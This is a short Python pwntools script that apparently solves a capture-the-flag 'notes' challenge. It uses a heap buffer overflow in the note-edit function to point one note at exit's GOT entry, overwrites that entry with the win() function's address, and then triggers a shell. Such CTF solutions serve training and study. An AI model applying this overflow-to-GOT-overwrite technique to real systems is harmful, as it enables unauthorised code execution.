#!/usr/bin/env python3

from pwn import *

elf = ELF("./notes.elf")
# libc = ELF("./libc.so.6")
# g = ROP(libc)

s  = remote("challs.tfcctf.com", 30593)
# s = process(elf.path)

def main():

	# 1. Add note
	# 2. Edit note
	# 3. View notes
	# 0. Exit

	s.sendline(b'1')
	s.sendline(b'0')
	s.sendline(b'a'*7)			# add notes[0]

	s.sendline(b'1')
	s.sendline(b'1')
	s.sendline(b'b'*7)			# add notes[1]

	pl = flat(
		p64(0xdeadface) * 3,
		p64(0x21),
		p64(elf.got.exit)
	)

	s.sendline(b'2')
	s.sendline(b'0')
	s.sendline(pl)				# BoF notes[0] => notes[1].context = got.exit

	s.sendline(b'2')
	s.sendline(b'1')
	s.sendline(p64(elf.sym.win))	# set notes[1].context (got.exit) = win()

	s.sendline(b'0')			# exit() <=> win()
	s.interactive()


if __name__=="__main__":
	main()